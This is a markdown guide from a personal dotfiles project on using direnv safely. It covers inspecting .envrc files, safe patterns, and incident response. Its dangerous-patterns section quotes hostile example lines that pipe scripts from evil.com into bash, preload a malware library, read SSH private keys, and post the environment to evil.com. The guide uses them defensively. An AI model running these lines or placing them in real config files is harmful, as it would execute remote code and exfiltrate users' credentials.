# 🔐 DIRENV SECURITY GUIDE - Faelight Forest

**Omarchy v2.9.0 - Security Foundation**

---

## ⚠️ CRITICAL SECURITY WARNING

**direnv executes arbitrary shell code from `.envrc` files.**

❌ **NEVER** auto-allow unknown repos  
❌ **NEVER** allow without inspection  
❌ **NEVER** trust `.envrc` files blindly

✅ **ALWAYS** inspect before allowing  
✅ **ALWAYS** verify safe patterns  
✅ **ALWAYS** trust your own repos only

---

## 🛡️ SAFE USAGE WORKFLOW

### **1. Enter Project Directory**

```bash
cd ~/projects/myproject
```

### **2. Inspect .envrc File**

```bash
envrc-inspect
# or
bat .envrc
```

### **3. Verify Safe Patterns** (see below)

### **4. Allow If Safe**

```bash
direnv allow
# or
envrc-allow
```

### **5. Changes Require Re-Approval**

```
If .envrc changes, you MUST inspect and re-allow!
direnv will warn you automatically.
```

---

## ✅ SAFE .envrc PATTERNS

### **Pattern 1: Simple Environment Variables**

```bash
# ✅ SAFE
export PROJECT_NAME="myproject"
export API_URL="http://localhost:3000"
export DEBUG=true
```

### **Pattern 2: Loading .env Files**

```bash
# ✅ SAFE (if .env is also inspected!)
dotenv .env
```

### **Pattern 3: Using mise (formerly rtx)**

```bash
# ✅ SAFE
use mise
```

### **Pattern 4: Adding to PATH**

```bash
# ✅ SAFE (after inspection!)
PATH_add ./bin
PATH_add ./node_modules/.bin
```

### **Pattern 5: Layout Functions**

```bash
# ✅ SAFE
layout python
layout node
```

---

## ❌ DANGEROUS .envrc PATTERNS

### **Pattern 1: Remote Code Execution**

```bash
# ❌ NEVER ALLOW
curl http://evil.com/script.sh | bash
wget -O- http://evil.com | sh
```

### **Pattern 2: Eval of External Commands**

```bash
# ❌ NEVER ALLOW
eval "$(some-remote-command)"
eval "$(curl http://...)"
```

### **Pattern 3: Sourcing Unknown Scripts**

```bash
# ❌ NEVER ALLOW
source /tmp/random-script.sh
source ~/../../etc/passwd
```

### **Pattern 4: Modifying Critical Paths**

```bash
# ❌ SUSPICIOUS
export PATH="/tmp/evil:$PATH"
export LD_PRELOAD="/tmp/malware.so"
```

### **Pattern 5: Credential Harvesting**

```bash
# ❌ NEVER ALLOW
export PASSWORD=$(cat ~/.ssh/id_rsa)
curl -X POST http://evil.com -d "$(env)"
```

---

## 🔍 INSPECTION CHECKLIST

Before running `direnv allow`, verify:

- [ ] No `curl`, `wget`, or network calls
- [ ] No `eval` of external commands
- [ ] No `source` of unknown scripts
- [ ] No suspicious PATH modifications
- [ ] No credential access (ssh keys, passwords)
- [ ] Only simple exports or known tools (mise, dotenv)
- [ ] File is in YOUR repo (not someone else's)

**If ANY item fails → DO NOT ALLOW!**

---

## 🎯 TRUSTED REPO WORKFLOW

### **Your Own Repos (Safe)**

```bash
cd ~/0-core
bat .envrc
# Verify it's YOUR code
direnv allow
```

### **Unknown/New Repos (DANGER!)**

```bash
git clone https://github.com/random/project
cd project
bat .envrc
# ⚠️ INSPECT EVERY LINE!
# ⚠️ Look for dangerous patterns!
# Only allow if 100% safe
```

### **After Git Pull**

```bash
# If .envrc changed, direnv will warn you
# MUST re-inspect!
bat .envrc
# Check what changed
git diff HEAD~1 .envrc
# Only re-allow if changes are safe
direnv allow
```

---

## 🛠️ USEFUL COMMANDS

```bash
# Inspect .envrc
envrc-inspect

# Check current status
direnv status

# Allow current directory
direnv allow

# Deny/block current directory
direnv deny

# Reload after changes
direnv reload

# List all allowed directories
cat ~/.config/direnv/allow/*
```

---

## 📚 EXAMPLE SAFE .envrc (Dotfiles)

```bash
# Omarchy Dotfiles .envrc
# Safe environment setup

# Project identification
export PROJECT_NAME="omarchy-0-core"
export PROJECT_VERSION="2.9.0"

# Development paths
PATH_add ./scripts
PATH_add ./automation

# Editor preference
export EDITOR=nvim

# Use mise for version management
use mise

# Load local overrides (if they exist)
dotenv_if_exists .env.local
```

---

## 🚨 INCIDENT RESPONSE

**If you accidentally allowed a malicious .envrc:**

1. **Immediately deny it:**

```bash
   direnv deny
```

2. **Exit the directory:**

```bash
   cd ~
```

3. **Check for damage:**

```bash
   # Check recent commands
   history | tail -50

   # Check environment
   env | grep -i suspicious

   # Check if anything was uploaded
   ss -tuln  # Check network connections
```

4. **Remove the allow entry:**

```bash
   rm ~/.config/direnv/allow/$(pwd | shasum | cut -d' ' -f1)
```

5. **Review the malicious code:**

```bash
   bat .envrc
   git log -p .envrc
```

6. **Report if from public repo:**
   - Report to GitHub/GitLab
   - Warn others

---

## 🎓 LEARNING RESOURCES

- direnv documentation: https://direnv.net/
- Security best practices: https://direnv.net/#security
- Common patterns: https://github.com/direnv/direnv/wiki

---

## ✅ SECURITY SUMMARY

**direnv is SAFE when used correctly:**

✅ Only allow your own repos  
✅ Always inspect before allowing  
✅ Use simple, safe patterns only  
✅ Re-inspect after changes  
✅ Trust but verify

**This fits Omarchy's security model:**

- LUKS2 encryption ✅
- UFW firewall ✅
- fail2ban ✅
- DNSOverTLS ✅
- Mullvad VPN ✅
- Gitleaks scanning ✅
- **direnv with strict inspection** ✅

---

**Last Updated:** 2025-12-13  
**Version:** 2.9.0  
**Status:** Security Foundation Complete 🛡️
